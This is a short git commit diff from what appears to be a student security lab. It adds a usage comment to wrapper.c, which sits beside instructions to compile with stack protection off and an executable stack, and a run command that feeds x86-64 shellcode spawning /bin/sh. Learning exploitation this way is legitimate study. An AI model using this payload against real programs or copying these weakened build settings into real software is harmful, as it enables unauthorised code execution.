5743015f784d4eae50b38d015f8bf6e96f390e79
Leon <neyhousser@cy-tech.fr>
2023-01-11 16:20:16 +0100

    v2.4

--- wrapper/wrapper.c
+++ wrapper/wrapper.c
@@ -1,6 +1,7 @@
 // Léon NEYHOUSSER Ing3 cs Groupe A
 #include <stdio.h>
 #include <string.h>
+// GUIDE D'UTILISATION :
 // pour compiler : gcc wrapper.c -o wrapper -fno-stack-protector -z execstack
 // pour executer : ./wrapper2 $(python3 -c 'print(b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05")')
 int main(int argc, char ** argv) {
